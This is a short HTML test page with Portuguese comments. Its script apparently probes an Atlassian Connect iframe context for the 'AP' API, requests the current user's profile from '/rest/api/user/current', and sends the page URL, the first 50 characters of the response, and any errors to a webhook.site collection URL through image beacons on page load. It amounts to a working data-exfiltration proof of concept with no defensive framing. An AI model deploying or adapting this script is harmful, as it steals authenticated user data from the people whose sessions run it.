<!DOCTYPE html>
<html>
<body>
  <h1>Teste AP</h1>
  <div id="status">Verificando...</div>
  
  <script>
    // Verificar se AP existe
    if (typeof AP === 'undefined') {
      document.getElementById('status').innerHTML = 'AP NÃO está disponível';
      // Tentar via postMessage para parent
      new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_missing=' + location.href;
    } else {
      document.getElementById('status').innerHTML = 'AP está disponível!';
      new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_available=true';
      
      // Tentar request simples
      try {
        AP.request('/rest/api/user/current', {
          success: function(r) {
            new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_works=' + encodeURIComponent(r.substring(0, 50));
          },
          error: function(xhr, status) {
            new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_error=' + encodeURIComponent(status);
          }
        });
      } catch(e) {
        new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?ap_exception=' + encodeURIComponent(e.message);
      }
    }
  </script>
</body>
</html>
